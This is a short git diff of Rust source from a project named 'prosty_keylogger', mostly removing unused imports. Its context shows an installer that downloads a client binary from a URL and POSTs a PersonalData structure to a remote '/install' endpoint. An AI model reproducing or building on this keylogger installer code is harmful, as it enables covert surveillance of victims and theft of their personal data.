@@ -1,15 +1,12 @@
 mod options;
 
 use std::fs;
-use std::path::{Path, PathBuf};
+use std::path::{Path};
 use reqwest::Url;
-use std::env;
 use std::os::windows::process::CommandExt;
-use anyhow::Error;
 use clap::Parser;
-use iced::advanced::layout::atomic;
 use log::{debug, error, info};
-use prosty_keylogger::common::{InstallConfiguration, PathFragment, PersonalData, TaskConfiguration};
+use prosty_keylogger::common::{InstallConfiguration, PathFragment, PersonalData};
 use crate::options::Options;
 
 async fn download_client(url: &Url) -> Result<Vec<u8>, anyhow::Error>{
@@ -124,7 +121,6 @@ async fn get_config(url: &Url, personal_data: Option<&PersonalData>) -> Result<I
         None => reqwest::get(url.to_owned()).await?.text().await?,
         Some(data) => {
             let client = reqwest::Client::new();
-            let json = serde_json::to_string(&data)?;
             client.post(url.join("/install")?).json(&data).send().await?.text().await?
         }
     };
